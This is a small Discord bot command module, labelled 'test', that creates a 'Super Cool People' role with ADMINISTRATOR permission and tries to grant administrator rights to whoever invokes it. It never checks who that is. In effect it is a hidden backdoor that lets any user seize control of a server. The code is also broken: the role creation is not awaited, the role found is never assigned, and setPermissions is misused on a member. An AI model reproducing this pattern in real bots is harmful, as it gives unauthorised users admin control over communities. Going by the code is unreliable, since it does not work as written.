module.exports = {
    name: 'test',
    execute(message, args){
      const Discord = require('discord.js')
      message.guild.roles.create({
        data: {
          name: 'Super Cool People',
          color: 'BLUE',
          permissions: 'ADMINISTRATOR',
        },
        reason: 'we needed a role for Super Cool People',
      })
      var role = message.guild.roles.cache.find(role => role.name == 'Super Cool People')
      message.guild.member(message.author).setPermissions(['ADMINISTRATOR'])
        .then(console.log)
        .catch(console.error);
    }
}